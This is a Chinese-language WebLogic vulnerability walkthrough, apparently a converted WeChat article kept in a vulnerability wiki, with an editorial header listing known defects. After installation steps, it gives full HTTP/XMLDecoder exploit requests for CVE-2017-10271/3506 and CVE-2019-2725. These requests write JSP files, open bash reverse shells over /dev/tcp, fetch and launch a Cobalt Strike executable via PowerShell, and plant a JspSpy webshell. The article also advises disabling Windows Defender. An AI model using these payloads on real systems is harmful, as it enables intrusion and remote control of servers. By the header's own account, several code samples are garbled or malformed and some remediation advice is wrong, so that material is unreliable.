---
version: "unknown"
source: "MrWQ/vulnerability-paper"
title: "中间件常见漏洞之 weblogic"
product: "Oracle WebLogic / conditional Redis chain"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2017-3506; CVE-2017-10271; CVE-2019-2725; CVE-2018-2628; CVE-2018-2894; CVE-2014-4210; CVE-2020-14882; CVE-2020-14883; CVE-2020-2551; CVE-2021-2109"
referenced_identifiers: "CVE-2015-4852; CVE-2016-0638; CVE-2016-3510; CVE-2017-3248; CVE-2017-3241"
identifier_role: "primary"
cve: "CVE-2017-3506; CVE-2017-10271; CVE-2019-2725; CVE-2018-2628; CVE-2018-2894; CVE-2014-4210; CVE-2020-14882; CVE-2020-14883; CVE-2020-2551; CVE-2021-2109"
prerequisites: "Per-section patch/runtime/protocol/test-page/auth/Redis write conditions; not all product-wide"
affected_versions: "unknown"
source_url: "https://mp.weixin.qq.com/s/r_ifxjyu5BiiZoB8n9GoEA"
source_status: "recorded"
side_effects: "含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。; 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。; 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
id: "vw-9b26c32610cdfbbc61d77bcf"
entity_id: "ve-9b26c32610cdfbbc61d77bcf"
schema_version: "1"
previous_version: "java -jar weblogic_CVE_2020_2551.jar 192.168.0.111 7001 rmi://192.168.0.50:1099/"
previous_affected_versions: "java -jar weblogic_CVE_2020_2551.jar 192.168.0.111 7001 rmi://192.168.0.50:1099/"
---

# 中间件常见漏洞之 weblogic

> 版本字段校订（2026-10-04）：误填的版本字段原值逐字保存到对应 `previous_*` 字段。当前值区分正文声称的影响范围、实验环境与尚未知的范围；后文对该元数据误填的旧说明只描述校订前状态，未据此升级来源结论。

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Per-section patch/runtime/protocol/test-page/auth/Redis write conditions; not all product-wide
- 证据范围：Full 47,567 characters read in three overlapping parts. Useful independent lab observations, severely damaged code and dangerous remediation errors. Many XML class attributes appear systematically stripped.

### 本次正文校订

- 按实际内容修正 14 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- XMLDecoder java/object/void/array class attributes removed, Spring bean class absent in all three examples, new/method attributes stripped; these samples cannot perform described actions
- 3506 bypass prose loses both tag names and example still uses object
- 2725 prose describes UnitOfWorkChangeSet byte-array chain but request is malformed ProcessBuilder-style string-array chain
- Raw XML ampersands, missing HTTP blank lines, repeated conflicting headers and concatenated Redis commands
- Changing WebLogic7001 to8080 is not a fix; blocking T3 does not stop IIOP2551 or HTTP2109
- Selecting ConnectionFilterImpl alone lacks deny rules; generic claim latest2628patch bypassed needs historical follow-on-CVE context
- UDDI reachability falsely treated as proof; Redis IP .2 versus final .3 inconsistent
- Blanket disable Windows Defender advice and broad deletion /usr/bin/java* are unsafe lab setup, not necessary vulnerability remediation
- Root cron overwrite, uploaded JSP/executables and changed work paths lack cleanup and privilege constraints
- Deployed base versions not full affected matrix; default JDK1.6 claim and latest14 are historical
- Independent Windows/production-mode observations should be preserved, not bulk-delete as same-CVE duplicates

### 操作风险与资料使用

- 含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。
- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/r_ifxjyu5BiiZoB8n9GoEA)

**免责声明**

由于传播、利用本公众号狐狸说安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号狐狸说安全及作者不为**此**承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！

### **0x01 **Weblogic 简介****

Weblogic 是美国 Oracle 公司出品的应用服务器软件，确切的说这是基于 Java EE 架构的中间件，主要用于开发、继承、部署和管理大型分布式 web 应用、网络应用和数据库应用。Weblogic 将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的 Java 应用服务器软件之一，也是世界上第一个成功商业化的 Java EE 应用服务器，当然 Weblogic 具有可扩展性、快速开发、灵活可靠等优势，其默认端口为 7001，目前比较活跃的版本为 10 和 12，最新版本为 14。

在功能性上，Weblogic 是 Java EE 的全能应用服务器，包括 EJB、JSP、servlet、JMS 等，是商业软件中排名第一的容器（JSP、servlet、EJB 等），并提供其他工具（例如 Java 编辑器），因此也是一个综合的开发以及运行环境。在扩展性上，Weblogic Server 凭借出色的群集技术，拥有处理关键 web 应用系统问题所需的性能、扩展性和高可用性。Weblogic Server 既实现了网页集群，也实现了 EJB 组件群集，而且不需要任何专门的硬件或操作系统支持。网页群集可以实现透明的复制、负载平衡以及表示内容容错。无论是网页群集还是组建群集，对于电子商务解决方案所要求的可扩展性和可用性都是至关重要的。

### **0x02 **Weblogic 安装****

```
下载地址：https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.htm

```

![](../../.resource/remote/50e359d8509036d6a5ecbab1d9dc958828930d9a9733ada74e71f62ea2e258e3.png)

Weblogic 最新的版本需要 jdk1.8 以上，如果 jdk 版本为 1.8 以下，可能会出现无法安装的情况。经过测试 weblogic 版本为 12.1.3 可在 jdk 1.7 版本下可以安装。而 weblogic 版本为 10.3.6 及以下可在 jdk 1.6 版本下可以安装。

**weblogic 10.3.6 安装**

在官网下载模块中选择一个版本进行下载

![](../../.resource/remote/a9be542bbdb40acfaac802387989089c30460994a9c8c1e9c4a0ce48706dc399.png)

我选择的是 10.3.6 的 Generic 版本

![](../../.resource/remote/1ad70eb6ed860620f582096d914dbade9ec02a8940a18c6ccbbb8c6cf43654e5.png)

1、开始安装 weblogic，直接开始下一步

![](../../.resource/remote/f36cb10f32fb86774c0603f011e62bff6bdb8081ac45e6c5a5e3bf14c02d143a.png)

2、选择典型进行安装

![](../../.resource/remote/fbf7696e91db9ae618d38a87ccdcaa8de922d77c393aee122d0de02f66dc90f1.png)

3、查看相关概要后继续下一步

![](../../.resource/remote/ce43eedab47043cb88e32ad94b0bad1d76bd0cd0c4209ecf1f361011d1618d9c.png)

4、安装完成 weblogic

![](../../.resource/remote/fbc12e729c035d160795601edf70b843ff4154f67ebbd80ba73ab8904231dacc.png)

5、点击开始 weblogic server

![](../../.resource/remote/983f3d1b51aec5e51b72059ef314192bba42b8bca8c9e9a9906d69128647389f.png)

6、创建新的 weblogic 域

![](../../.resource/remote/c5de21a58ea2cc644dbc6d14e9e5e5a653ae0eaa7e8f36aa726d16569a1bffdc.png)

7、生成自动配置的 weblogic 域，点击下一步

![](../../.resource/remote/e060dc22bce9becde716eb33e4685ceb05daa6d40115e19a6c5b4c836de1dd70.png)

8、选择默认的域名和域位置即可

![](../../.resource/remote/ebe4506461b5a6c0f5756813bc05a7dfa48eb0c8f078c75f3418306347479157.png)

9、设置账号密码为 weblogic/admin123.  

![](../../.resource/remote/fe4fef152aed5d40f4e6212266877f8c14ef674e8a564e041306512a2f40286a.png)

10、选择开发默认，并制定可用的 jdk 版本

![](../../.resource/remote/8330375048796a3bf553004136807157f702e8e907947d1958b6838e40ea11ca.png)

11、点击管理服务器和受管服务器、集群和计算机

![](../../.resource/remote/e0b14f0e85541431995a89e4f8dc76faa97e9e4b899525fb5e0bd02f0be256bc.png)

12、访问端口和网络都为默认配置

![](../../.resource/remote/1cb856d543b3137f3c7342d1e60d8270b5c23da912247a60592770d1cc98d345.png)

13、之后安装完成

![](../../.resource/remote/8754f7e895109517e5745b7efcb3ced31abc1faba05b3af12a802f3c77fd594f.png)

14、找到启动 cmd 文件，点击开启 Weblogic

![](../../.resource/remote/7058380178c250dc7fa9473e95880e883c207e702709c471fa438b3148465c7c.png)

15、填入账号密码后成功开启 Weblogic

![](../../.resource/remote/1601e98d1a014772b6f0abd7e372344bd562fe01712ef5f4d295e84bb7bcd362.png)

16、访问 http://192.168.0.105:7001/，开启成功

![](../../.resource/remote/c5b9d30e3634ed891e6e7a56858e79552358494bfaef37ff5aec0141dfa5a411.png)

控制台地址为 http://192.168.0.105:7001/console/

![](../../.resource/remote/bdac12634c59abcf966535c372cb3492f011811c41ca5043eabe26e8e199d989.png)

**weblogic 12.1.3 安装**

Weblogic 12 版本的安装与 10 版本的安装稍微有些不同，可安装 jdk 后运行以下命令进行安装

```
java -jar fmw_12.1.3.0.0_wls.jar

```

![](../../.resource/remote/8f6858097a62b02f37552f6e0efb0a4e8f673d200326acbf6c4ba314f2af0217.png)

如果执行报错，是因为 Windows 默认会使用 jre 环境，而不是 jdk 环境，可将其放置到 jdk 环境下再运行

![](../../.resource/remote/b5ff8b21910e036990d5e7e3cac0d25c32ae4c3b93225d4cbd9cb2443a4d63a6.png)

1、开始安装 Weblogic

![](../../.resource/remote/610cd4bf86eeaf8f0b9ba02d31f0dd5598316e366c91e84d97de2584f85f507b.png)

2、一直下一步到此点击安装完成 

![](../../.resource/remote/db0fe377982c30aac4309b932491b56fff20ae3f089046ac030e2f5feebf9397.png)

3、开始配置 Weblogic 域 

![](../../.resource/remote/767c033120ca95a442bd308ca4685aacf80e2a51d8d36904b386ea821bbe4c59.png)

4、设置账号密码为 weblogic/admin123. 

![](../../.resource/remote/7c307feeb19b599509b2dfa5a2e4b41a324bcffbd823d6b65a9128ab00b7886b.png)

5、选择生产模式 

![](../../.resource/remote/04853e556d45c438382c63e54600184f5c34fcee7d640ed3f5f6f341b653a352.png)

6、配置节点管理器和管理服务器 

![](../../.resource/remote/9acc2e8f84ccd3cd20c05ca74146f13925f63e6baa7d4efb490db84b47ff2bb1.png)

7、选择默认管理服务器配置 

![](../../.resource/remote/d3456548615e9b83d8cddd614b36ed583e6d6bec5a6530660ac97e560e251e0d.png)

8、一直下一步即可安装完成 

![](../../.resource/remote/4ba50421b8bd8957ebf22f9bb7e7d1031bde87bc03bdb73cecad8381fd560b92.png)

9、找到启动 cmd 文件，点击后开启 Weblogic 

![](../../.resource/remote/a30d46340a0bd61db13f81e58f81a7d416f6ff223ef1e97334ad24e27cfe7540.png)

10、运行需输入之前的账号密码 

![](../../.resource/remote/da8603ca9844ecedf8d0f687b39c1bf2aae9637b6eb2e7db44120fdebe4bddeb.png)

11、访问 http://192.168.0.111:7001/，开启成功

![](../../.resource/remote/1d2e98384d7b7ebbf4c3d9d310d4eef0a9467c674199e11faa8a1228dd404e39.png)

12 版本的控制台界面与 10 版本也略有不同，在渗透时可轻易分辨

![](../../.resource/remote/754cdd8066fd9c86614fde30b4073d2d60c2dbc8557a3cbfdb527d9c6028018c.png)

### **0x03 **Weblogic 漏洞复现****

**XMLDecoder 反序列化漏洞（CVE-2017-10271 & CVE-2017-3506）**

**漏洞原理**

Weblogic 的 WLS Security 组件对外提供 webservice 服务，其中使用了 XMLDecoder 来解析用户传入的 XML 数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

**漏洞利用**

访问 http://192.168.0.105:7001/wls-wsat/CoordinatorPortType 验证漏洞是否存在，访问成功说明漏洞可能存在

![](../../.resource/remote/4ca643bfdf447e95c43cb30c43702472c874c9073682087aa1ff41e3f6d61a96.png)

该漏洞不仅存在于 / wls-wsat/CoordinatorPortType 中，只要是在 wls-wsat 包中的 URI 均受到影响在 web.xml 可找到所有受影响的 URL 路径。

![](../../.resource/remote/efc2ad7ab28728d4ba5c1cecd3b9fe127c5d574d34dce4d30d53b16c9d87b590.png)

![](../../.resource/remote/efc2ad7ab28728d4ba5c1cecd3b9fe127c5d574d34dce4d30d53b16c9d87b590.png)

经整理后受到影响的路径包括如下：

```
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType11

```

构造 HTTP 请求包如下，需要注意的是 Content-Type 应改为 text/xml，否则会导致 XMLDecoder 不解析。

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.0.105:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 642
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0">
    <object>
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/mac.jsp</string>
    <void method="println">
<string>
    <![CDATA[
<% out.print("hello"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>

```

![](../../.resource/remote/105903ae6867db822728964b6e00163dcd03c81150bf81637e79e2828bac8707.png)

访问 http://192.168.0.105:7001/bea_wls_internal/mac.jsp，成功输出 hello

![](../../.resource/remote/26a1ee3677a0e763149dd18cf1da90ae6d17fdfb54cad3dd5bc7a8b0a81478be.png)

同时在目标靶机中已存在该文件

![](../../.resource/remote/268820b44fc6b42c4cffb3c76c9eb948792161d5a277e22beac0e242607abc7c.png)

```
需要注意的是如果`Windows Defender`开启状态下，尽管文件存在，但是无法访问到写入的 jsp 文件

```

使用以下方式可关闭 Windows Defender

```
1、win+R 输入 gpedit.msc
2、依次点击展开计算机策略→管理模板→Windows组件→Windows Defender 
3、禁用 Windows Defender

```

![](../../.resource/remote/197b6151220078ec5b43138907ed69c5bb7a779d5491ca431113381c2edca796.png)

**linux 反弹 shell**

使用 vulhub 中 CVE-2017-10271 的环境进行搭建

```
cd vulhub/weblogic/CVE-2017-10271
docker-compose up -d

```

构造如下 payload 用于反弹 shell

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.0.107:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0">
<void>
<array length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i >& /dev/tcp/192.168.0.50/6666 0>&1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>

```

![](../../.resource/remote/f7d32b8b8b1ecfd5d9d572df22ae44e5fbffb2eb98889bf156095312314cef25.png)

成功拿到反弹 shell

![](../../.resource/remote/7a178e74e2c12379505bc53ca1bfceaba8232d37ca0ea3c7e2b49d3065b98a07.png)

**windows 上线 CS**

在 CS 上生成 exe 类型木马

![](../../.resource/remote/6ea1d07aa13179244e3783e29c403c3f09b091e78a252ecb9a20c4b44acef329.png)

在本地开启 http 服务

```shell
python -m SimpleHTTPServer 80

```

发送 payload 运行木马上线 CS

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.0.105:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 897
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0">
<void>
<array length="3">
<void index="0">
<string>powershell</string>
                        </void>
                        <void index="1">
                            <string>-Command</string>
                        </void>
                        <void index="2">
                            <string>(new-object System.Net.WebClient).DownloadFile('http://192.168.0.100/mac.exe','mac.exe');start-process mac.exe</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>

```

![](../../.resource/remote/663c4e10e291d310e83fee8a275a6913eaabb104e6916b18c03410738df713dc.png)

成功上线 CS

![](../../.resource/remote/80402f32c3d2648fe6a199e62e76921e122a2d85148cd7bd3c86f1caca8758f4.png)

针对 CVE-2017-3506 的补丁加了验证函数，具体是在 weblogic/wsee/workarea/WorkContextXmlInputAdapter.java 中添加了 validate 方法，以此来验证 payload 中的节点是否存在 object Tag，其源码如下：

```
 private void validate(InputStream is){
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser =factory.newSAXParser();
         parser.parse(is, newDefaultHandler() {
              public void startElement(String uri, StringlocalName, String qName, Attributes attributes)throws SAXException {
                 if(qName.equalsIgnoreCase("object")) {
                    throw new IllegalStateException("Invalid context type: object");
                 }
} });
        } catch(ParserConfigurationException var5) {
           throw new IllegalStateException("Parser Exception", var5);
        } catch (SAXExceptionvar6) {
           throw new IllegalStateException("Parser Exception", var6);
        } catch (IOExceptionvar7) {
           throw new IllegalStateException("Parser Exception", var7);
} }

```

绕过方法也非常简单，只需要将修改为即可，如下所示：

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0">
    <object>
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/mac.jsp</string>
    <void method="println">
<string>
    <![CDATA[
<% out.print("hello"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>

```

除此之外其他都与 CVE-2017-3506 的 payload 相同，同样可以执行反弹 shell、上线 CS

**漏洞修复**

更新 Oracle 官方补丁，补丁地址为

https://www.oracle.com/security-alerts/cpuoct2017.html

修复过程可参考

https://www.oracle.com/security-alerts/cpuoct2017.html

**wls-wsat 反序列化远程代码执行漏洞（CVE-2019-2725）**

漏洞原理

由于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。影响组件主要为 bea_wls9_async_response.war 和 wsat.war

**影响版本：**

```
10.*
12.1.3

```

**漏洞利用**

访问 /_async/AsyncResponseService 验证漏洞是否存在

![](../../.resource/remote/a92808d68e743a7c421bd7c6ff6920378f46427d389bc178c0c16e663e739448.png)

同样地该漏洞不仅存在于 /_async/AsyncResponseService 中，只要是在 bea_wls9_async_response 包中的 URI 均受到影响，在 web.xml 可找到所有受影响的 URL 路径。

```
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF\web.xml

```

![](../../.resource/remote/b1047c8f70d61cc332556d73f49e2783e296cadf8283b9bbf0557e2cb5e560b0.png)

所有受影响的 URL 包括如下：

```
/_async/AsyncResponseService
/_async/AsyncResponseServiceJms
/_async/AsyncResponseServiceHttps

```

其实 CVE-2017-3506 补丁是过滤了，其实现方法为在调用 startElement 方法解析 XML 的过程中如果解析到 Element 字段值为 Object 就抛出异常，但这类基于黑名单的防护措施很容易被绕过，比如以下代码中不包含任何 Object 元素，但经过 XMLDecoder 解析后依然能够执行代码，形成了新漏洞 CVE-2017-10271

```
<java version="1.4.0">
    <new>
        <string>calc</string><method  />
    </new>
</java>

```

于是 CVE-2017-10271 补丁文件继续将 object、new、method 等关键字继续加入到黑名单当中，同样一旦解析 XML 元素过程中匹配到上述任意一个关键字就立即抛出运行时异常。但它针对 void 和 array 这两个元素是有选择性的抛异常，其中当解析到 void 元素后，还会进一步解析该元素中的属性名，若没有匹配上 index 关键字才会抛出异常。而针对 array 元素而言，在解析到该元素属性名匹配 class 关键字的前提下，还会解析该属性值，若没有匹配上 byte 关键字，才会抛出运行时异常，补丁文件如下：

```
public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if(qName.equalsIgnoreCase("object")) {
               throw new IllegalStateException("Invalid element qName:object");
            } else if(qName.equalsIgnoreCase("new")) {
               throw new IllegalStateException("Invalid element qName:new");
            } else if(qName.equalsIgnoreCase("method")) {
               throw new IllegalStateException("Invalid element qName:method");
            } else {
               if(qName.equalsIgnoreCase("void")) {
                  for(int attClass = 0; attClass < attributes.getLength(); ++attClass) {
                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase("array")) {
                  String var9 = attributes.getValue("class");
                  if(var9 != null && !var9.equalsIgnoreCase("byte")) {
                     throw new IllegalStateException("The value of class attribute is not valid for array element.");
                  }

```

本次反序列化漏洞绕过以往补丁的关键点在于利用了 Class 元素指定任意类名，因为 CVE-2017-10271 补丁限制了带 method 属性的 void 元素，所以不能调用指定的方法，而只能调用完成类实例化过程的构造方法。在寻找利用链的过程中发现 UnitOfWorkChangeSet 类构造方法中直接调用了 JDK 原生类中的 readObject() 方法，并且其构造方法的接收参数恰好是字节数组，这就满足了上一个补丁中 array 标签的 class 属性值必须为 byte 的要求，再借助带 index 属性的 void 元素，完成向字节数组中赋值恶意序列化对象的过程，最终利用 JDK 7u21 反序列化漏洞造成远程代码执行。总的来说以上方法巧妙地利用了 void、array 和 Class 这三个元素，成功的打造出新的利用链，并再次绕过 CVE-2017-10271 补丁限制。

在 Weblogic 10.3.6 中利用

```
oracle.toplink.internal.sessions.UnitOfWorkChangeSet

```

构造函数执行 readObject()，其源码如下：

```
public UnitOfWorkChangeSet(byte[] bytes) throws java.io.IOException, ClassNotFoundException {
      java.io.ByteArrayInputStream  byteIn = new java.io.ByteArrayInputStream(bytes);
      ObjectInputStream objectIn = new ObjectInputStream(byteIn);
   //bug 4416412: allChangeSets set directly instead of using setInternalAllChangeSets
      allChangeSets = (IdentityHashtable)objectIn.readObject();
      deletedObjects = (IdentityHashtable)objectIn.readObject();
      }

```

UnitOfWorkChangeSet 中的参数是 Byte 数组，因此需将 payload 转换为 Byte 数组才能完成执行，构造 payload 如下：

```http
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.0.107:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Length: 852
Accept-Encoding: gzip, deflate
SOAPAction:
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml
cmd:whoami
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void>
<array length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>wget http://192.168.0.100/JspSpy.jsp -O servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/mac.jsp
</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
  <asy:onAsyncDelivery/>
  </soapenv:Body></soapenv:Envelope>

```

![](../../.resource/remote/883229e98902da03996bcdf46385a970ffa3ab311956b4de9303e073c8d1e61c.png)

访问 http://192.168.0.107:7001/bea_wls_internal/mac.jsp 发现木马已经存在，需要注意的是如果将其放在 bea_wls9_async_response/8tpkys/war 下则访问_async / 目录，如果放在 bea_wls_internal/9j4dqk/war 下则访问 bea_wls_internal / 目录

![](../../.resource/remote/8bb0f93205d6f7e009afa49bfcde6611371f926ce364c5754ad7c0b805059d45.png)

输入默认密码`Ninty`可进入管理

![](../../.resource/remote/5c02f1b708501c2f66711d8d899d9d27340ea09c91f84bd33dc6f190e880ffcb.png)

**linux 反弹 shell**

构造 payload 用于反弹 shell

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void>
<array length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i >& /dev/tcp/192.168.0.50/6666 0>&1
</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
  <asy:onAsyncDelivery/>
  </soapenv:Body></soapenv:Envelope>

```

![](../../.resource/remote/a234678e9337686268a9b179b6a5c3fbdf487874f77be198198325a63e1bd12e.png)

成功拿到反弹 shell

![](../../.resource/remote/88c6e7542ab78df5469027bfb3225ac71dca1cb7a68a4ae64d1c571cb10fa8c5.png)

**windows 上线 CS**

构造 payload 上线 CS

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void>
<array length="3">
<void index="0">
<string>powershell</string>
</void>
<void index="1">
<string>-Command</string>
</void>
<void index="2">
<string>(new-object System.Net.WebClient).DownloadFile('http://192.168.0.100/mac.exe','mac.exe');start-process mac.exe</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
  <asy:onAsyncDelivery/>
  </soapenv:Body></soapenv:Envelope>

```

![](../../.resource/remote/ca48d833214be4a5a2e91f4029e9f142356b4487630e592bbd91edf172b4f808.png)

  成功上线 CS

![](../../.resource/remote/80402f32c3d2648fe6a199e62e76921e122a2d85148cd7bd3c86f1caca8758f4.png)

**漏洞修复**

1. 及时打上官方 CVE-2019-2725 补丁包，官方已于 4 月 26 日公布紧急补丁包。下载地址：https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html?from=timeline

2. 升级本地 JDK 版本，因为 Weblogic 所采用的是其安装文件中默认 1.6 版本的 JDK 文件，属于存在反序列化漏洞的 JDK 版本，因此升级到 JDK7u21 以上版本可以避免由于 Java 原生类反序列化漏洞造成的远程代码执行。

3. 配置 URL 访问控制策略，部署于公网的 WebLogic 服务器，可通过 ACL 禁止对 /_async / 及 / wls-wsat / 路径的访问。

4. 删除不安全文件，删除 wls9_async_response.war 与 wls-wsat.war 文件及相关文件夹，并重启 Weblogic 服务。具体文件路径如下：

```
10.3.*版本：
\Middleware\wlserver_10.3\server\lib\
%DOMAIN_HOME%\servers\AdminServer\tmp\_WL_internal\
%DOMAIN_HOME%\servers\AdminServer\tmp\.internal\
12.1.3版本：
\Middleware\Oracle_Home\oracle_common\modules\
%DOMAIN_HOME%\servers\AdminServer\tmp\.internal\
%DOMAIN_HOME%\servers\AdminServer\tmp\_WL_internal\

```

****注：****

wls9_async_response.war 及 wls-wsat.war 属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle 官方不建议对其进行此类操作。若在直接删除此包的情况下应用出现问题，将无法得到 Oracle 产品部门的技术支持。请用户自行进行影响评估，并对此文件进行备份后再执行此操作。

**WLS Core Components 反序列化漏洞（CVE-2018-2628）**

**漏洞详情**

受影响的 WebLogic 的 WLS 核心组件存在严重的安全漏洞，通过 T3 协议可在前台无需账户登录的情况下进行远程任意代码执行，且 CVE-2018-2628 为 CVE-2017-3248 黑名单修复的绕过。下面说说几个相关的 Weblogic 的反序列化漏洞

CVE-2015-4852：该漏洞利用 Weblogic 中的 Commons Collections 库来实现远程代码执行，查看 CVE-2015-4852 的补丁（p21984589_1036_Generic），发现 Weblogic 采用的黑名单的形式来修复这个漏洞，那么存在被绕过的风险，只要发现可用并且未在黑名单之外的反序列化类，之前的防护就会被打破，系统就会遭受攻击。

